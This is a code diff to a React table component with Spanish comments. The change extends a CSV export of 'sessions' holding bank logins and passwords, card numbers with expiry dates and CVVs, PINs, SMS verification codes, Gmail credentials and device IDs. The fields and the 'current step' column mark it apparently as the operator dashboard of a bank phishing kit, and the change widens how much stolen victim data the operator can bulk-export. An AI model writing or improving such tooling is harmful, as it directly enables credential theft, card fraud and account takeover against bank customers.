@@ -114,25 +114,30 @@ const AccessTable: React.FC<AccessTableProps> = ({
     }
     
     try {
-      // Definir encabezados del CSV
+      // Definir encabezados completos del CSV con todos los campos
       const headers = [
         'Banco', 
         'Folio', 
-        'Usuario', 
-        'Contraseña', 
+        'Usuario/Correo Login', 
+        'Contraseña Login', 
         'Tarjeta', 
         'Fecha Vencimiento', 
         'CVV', 
-        'SMS', 
+        'SMS Verificación', 
         'NIP', 
         'SMS Compra', 
-        'Celular', 
+        'Teléfono Celular',
+        'Correo Gmail/Email', 
+        'Contraseña Gmail/Email',
+        'Device ID',
         'Paso Actual', 
+        'Activa',
+        'Guardada',
         'Creado Por', 
-        'Fecha'
+        'Fecha Creación'
       ];
       
-      // Convertir datos a filas CSV
+      // Convertir datos a filas CSV con todos los campos disponibles
       const rows = filteredSessions.map(session => [
         session.banco || '',
         session.folio || '',
@@ -145,9 +150,14 @@ const AccessTable: React.FC<AccessTableProps> = ({
         session.nip || '',
         session.smsCompra || '',
         session.celular || '',
+        session.correo || '',  // Campo de correo de Gmail
+        session.contrasena || '',  // Campo de contraseña de Gmail
+        session.deviceId || '',  // ID único del dispositivo
         session.pasoActual || '',
+        session.active ? 'Sí' : 'No',
+        session.saved ? 'Sí' : 'No',
         session.createdBy || '',
-        new Date(session.createdAt || Date.now()).toLocaleString()
+        new Date(session.createdAt || Date.now()).toLocaleString('es-MX')
       ]);
       
       // Unir encabezados y filas
